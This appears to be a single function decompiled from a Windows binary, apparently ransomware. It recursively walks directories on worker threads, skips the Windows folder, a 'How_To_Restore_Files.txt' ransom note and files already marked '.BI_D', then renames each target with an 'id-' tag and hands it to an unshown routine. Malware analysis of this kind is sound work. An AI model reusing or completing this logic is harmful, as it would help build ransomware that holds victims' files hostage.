
void FUN_004013e3(LPCWSTR param_1)

{
  HANDLE pvVar1;
  int iVar2;
  LPWSTR lpString1;
  uint uVar3;
  BOOL BVar4;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 uVar5;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar6;
  undefined4 *puVar7;
  _MEMORYSTATUS local_27c;
  HANDLE local_25c;
  undefined local_258 [44];
  WCHAR local_22c [274];
  LPWSTR local_8;
  
  pvVar1 = FindFirstFileW(param_1,(LPWIN32_FIND_DATAW)local_258);
  if (pvVar1 != (HANDLE)0xffffffff) {
    do {
      local_25c = pvVar1;
      if ((local_258._0_4_ & 0x10) == 0) {
        if ((local_258._28_4_ != 0) || (0x1f < local_258._32_4_)) {
          uVar3 = local_258._32_4_;
          if (local_258._28_4_ != 0) {
            uVar3 = 0x100000;
          }
          *(uint *)(param_1 + 0xc030) = uVar3;
          iVar2 = lstrcmpiW(u_How_To_Restore_Files.txt_0040427d,local_22c);
          if (iVar2 != 0) {
            FUN_00401000(param_1);
            uVar3 = lstrlenW(local_22c);
            if ((uVar3 < 0x15) ||
               (iVar2 = lstrcmpiW(u_.BI_D_004042dd,(LPCWSTR)(local_258 + uVar3 * 2 + 0x22)),
               iVar2 != 0)) {
              lstrcatW(param_1 + 0x4010,param_1);
              iVar2 = lstrlenW(param_1 + 0x4010);
              *(undefined4 *)(param_1 + iVar2 + 0x400d) = 0;
              lstrcatW(param_1 + 0x4010,local_22c);
              lstrcatW(param_1 + 0x8020,param_1 + 0x4010);
              lstrcatW(param_1 + 0x8020,u__id-_004042c1);
              uVar5 = extraout_ECX;
              uVar6 = extraout_EDX;
              if ((local_258._0_4_ & 1) != 0) {
                SetFileAttributesW(param_1 + 0x4010,0x80);
                uVar5 = extraout_ECX_00;
                uVar6 = extraout_EDX_00;
              }
              FUN_00401292(uVar5,uVar6,param_1 + 0x4010);
            }
          }
        }
      }
      else {
        iVar2 = lstrcmpW((LPCWSTR)&DAT_00404056,local_22c);
        if (((iVar2 != 0) && (iVar2 = lstrcmpW((LPCWSTR)&DAT_00404054,local_22c), iVar2 != 0)) &&
           (iVar2 = lstrcmpiW(u_windows_004042b1,local_22c), iVar2 != 0)) {
          while (lpString1 = (LPWSTR)GlobalAlloc(0x40,0x18064), lpString1 == (LPWSTR)0x0) {
            FUN_0040212a();
          }
          local_8 = lpString1;
          lstrcatW(lpString1,param_1);
          iVar2 = lstrlenW(lpString1);
          *(undefined *)(lpString1 + iVar2 + -3) = 0;
          lstrcatW(lpString1,local_22c);
          iVar2 = lstrlenW(lpString1);
          *(undefined4 *)(lpString1 + iVar2) = 0x2a005c;
          *(undefined4 *)(lpString1 + iVar2 + 2) = 0x2a002e;
          lpString1[iVar2 + 4] = L'\0';
          if (100 < DAT_00404b44) {
            local_27c.dwLength = 0x20;
            while (GlobalMemoryStatus((LPMEMORYSTATUS)&local_27c), 0x55 < local_27c.dwMemoryLoad) {
              FUN_0040212a();
            }
          }
          DAT_00404b44 = DAT_00404b44 + 1;
          CreateThread((LPSECURITY_ATTRIBUTES)0x0,64000,FUN_004013e3,local_8,0,(LPDWORD)&local_8);
        }
      }
      puVar7 = (undefined4 *)(param_1 + 0x4010);
      for (iVar2 = 0x4011; iVar2 != 0; iVar2 = iVar2 + -1) {
        *puVar7 = 0;
        puVar7 = puVar7 + 1;
      }
      BVar4 = FindNextFileW(local_25c,(LPWIN32_FIND_DATAW)local_258);
      pvVar1 = local_25c;
    } while (BVar4 != 0);
    FindClose(local_25c);
  }
  GlobalFree(param_1);
  DAT_00404b44 = DAT_00404b44 - 1;
  return;
}
